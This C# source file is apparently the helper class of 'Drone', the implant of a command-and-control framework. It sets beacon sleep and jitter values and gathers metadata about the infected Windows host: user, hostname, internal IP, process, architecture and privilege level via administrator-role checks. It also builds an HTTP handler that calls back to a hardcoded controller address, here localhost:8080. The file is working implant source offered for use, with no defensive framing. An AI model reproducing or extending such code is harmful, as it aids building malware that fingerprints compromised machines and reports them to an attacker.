using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

using Drone.Handlers;
using Drone.Interfaces;
using Drone.Models;
using Drone.Services;

namespace Drone.Utilities;

internal static class Helpers
{
    internal static IConfig GetDefaultConfig
    {
        get
        {
            var config = new Config();
        
            config.Set("SleepInterval", SleepInterval);
            config.Set("SleepJitter", SleepJitter);

            return config;
        }
    }

    internal static Metadata GetMetadata
    {
        get
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddresses(hostname);
            var process = Process.GetCurrentProcess();

            using var identity = WindowsIdentity.GetCurrent();

            return new Metadata
            {
                Id = Guid.NewGuid().ConvertToShortGuid(),
                User = identity.Name,
                Hostname = hostname,
                InternalAddress = addresses.LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(),
                Process = process.ProcessName,
                ProcessId = process.Id,
                Integrity = GetIntegrity,
                Architecture = Environment.Is64BitProcess ? "x64" : "x86"
            };
        }
    }

    internal static IHandler GetHandler => new HttpHandler(ConnectAddress, ConnectPort);
    
    public static string GetRandomString(int length)
    {
        const string chars = "1234567890qwertyuiopasdfghjklzxcvbnm";
        var rand = new Random();
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[rand.Next(s.Length)]).ToArray());
    }

    private static string GetIntegrity
    {
        get
        {
            var integrity = "Medium";

            using var identity = WindowsIdentity.GetCurrent();
            if (identity.Name.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase))
            {
                integrity = "SYSTEM";
            }
            else if (identity.Owner != identity.User)
            {
                var principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    integrity = "High";
                }
            }

            return integrity;
        }
    }

    private static string ConnectAddress => "localhost";
    private static int ConnectPort => int.Parse("8080");
    private static int SleepInterval => int.Parse("5");
    private static int SleepJitter => int.Parse("0");
}